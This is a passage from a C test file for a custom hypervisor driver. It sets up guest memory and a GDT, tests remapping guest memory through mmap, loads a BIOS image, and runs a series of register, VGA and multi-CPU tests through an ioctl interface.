//	//int addr_gdt_code = i;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0b10011010;
//	guest_memory[i++] = 0b11001111;
//	guest_memory[i++] = 0x0;
//	// gdt_data
//	//int addr_gdt_data = i;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0xff;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0b10010010;
//	guest_memory[i++] = 0b11001111;
//	guest_memory[i++] = 0x0;
//	// gdt_end
//	int addr_gdt_end = i;
//	// gdt desc
//	//int addr_gdt_desc = i;
//	guest_memory[i++] = addr_gdt_end-addr_gdt;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x10;
//	guest_memory[i++] = 0x0;
//	guest_memory[i++] = 0x0;
//	//printf("GDT DESC: %x\n", addr_gdt_desc); exit(0);
//
//	// go into protected mode
//	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);
//	assert(ooo_states[0].regs.rax == APIC_DEFAULT_ADDRESS | IA32_APICBASE_ENABLE |  IA32_APICBASE_BSP);
//	handle_mmio(&ooo_states[0], guest_memory);
//
//	TEARDOWN_ASMTEST();
//}

//
// This tests the insane thing they made me do
//
ASM_CODE(remap, "hlt;")
void test_remap()
{
	SETUP_ASMTEST(remap);
	assert(ooo_states[0].regs.rbx == 0); // to stop this from complaining

	unsigned char *new_guest_memory = mmap(0, MEM_TO_MAP, PROT_WRITE | PROT_READ, MAP_SHARED, hyper_fd, 0);
	assert(new_guest_memory != guest_memory);
	guest_memory[1337] = 'A';
	assert(new_guest_memory[1337] == 'A');
	new_guest_memory[1337] = 'Z';
	assert(guest_memory[1337] == 'Z');
	munmap(new_guest_memory, MEM_TO_MAP);

	unsigned char *off_guest_memory = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_SHARED, hyper_fd, 0x1000);
	guest_memory[0x1001] = 'J';
	assert(off_guest_memory[1] == 'J');
	off_guest_memory[2] = 'P';
	assert(guest_memory[0x1002] == 'P');
	munmap(off_guest_memory, 0x1000);

	TEARDOWN_ASMTEST();

}

ASM_CODE(bios, "cpuid; hlt;");
void test_bios() {
	SETUP_ASMTEST(bios);
	//ooo_state_t ooo_states[MAX_VCPUS] = { 0 };
	//int hyper_fd = open("/dev/hyper-o", 0);
	//void *guest_memory = mmap(0, 0x200000, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
	//guest_map(hyper_fd, guest_memory, 0, 0xA0000);
	//guest_map(hyper_fd, guest_memory+0xC0000, 0xC0000, 0x200000-0xC0000);
	ooo_states[0].regs.rsp = 0;
	ooo_states[0].regs.rip = 0xfff0;
	int ret;
	/* now BIOS, the VCPU will jump to 0xFFFF0 when it boots */
	//void *bios_rom = mmap((void *)HOST_BIOS_VADDR,
	//								 HOST_BIOS_SIZE,
	//								 PROT_READ|PROT_WRITE,
	//								 MAP_ANON|MAP_SHARED|MAP_FIXED,
	//								 -1,
	//								 0);
	//if (bios_rom == MAP_FAILED) {
	//	printf("bad news\n");
	//}

	// TODO: we might need to dynamically resolve the filesystem location of the
	// bios blob
	int fd = open("bios", O_RDONLY);
	if (fd < 0) {
		printf("bad news open\n");
	}

	ret = read(fd, guest_memory + 0xFC000, 0x4000);
	printf("DONGUS MAN WTF: 0x%x\n", ((uint8_t *)(guest_memory+0x4000-0x10))[0]);
	if (ret < 0) {
		printf("bad news read\n");
	}
	close(fd);

	/*
	while (ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_TRAP_FLAG) {
		debug_step(&ooo_states[0], guest_memory);
	}
	*/
	assert(ioctl(hyper_fd, OOO_RUN, &ooo_states[0]) == EXITCOOODE_EPT_VIOLATION);
	TEARDOWN_ASMTEST();
	/*
	while (1) {
		int ret = ioctl(hyper_fd, OOO_RUN, &ooo_states[0]);
		switch (ret) {
			case EXITCOOODE_EPT_VIOLATION:
				printf("phys_addr: 0x%lx\n", ooo_states[0].mmio.phys_addr);
				break;
			case EXITCOOODE_IO:
				printf("Port: %d\n", ooo_states[0].io.port);
				break;
			default:
				return;
		}
	}
	*/
}

int main()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	//test_apic();
	test_mov_eax();
	test_remap();
	//test_pio();

	test_jmpback();
	test_inc_ax();
	test_inc_bx();
	test_inc_cx();
	test_inc_dx();
	test_inc_si();
	test_inc_di();
	test_inc_bp();
	test_inc_sp();
	test_mov_ax();
	test_mov_bx();
	test_mov_cx();
	test_mov_dx();
	test_mov_si();
	test_mov_di();
	test_mov_bp();
	test_mov_sp();

	test_vga_fault();
	test_memfill_to_vga();
	test_after_vga();

	test_setrdi();
	test_cpuid();
	test_reg_mod();
	//test_pio_in();
	//test_pio_out();
	
	//test_mmio_bad();
	//test_mmio();
	//test_bios();

	test_smp(get_nprocs() - 1); // test SMT with fewer procs than we have
	test_smp(MAX_VCPUS); // test SMT with more procs than we have
	test_swap(MAX_VCPUS);
	test_race(2);

	puts("ALL DONE");
}
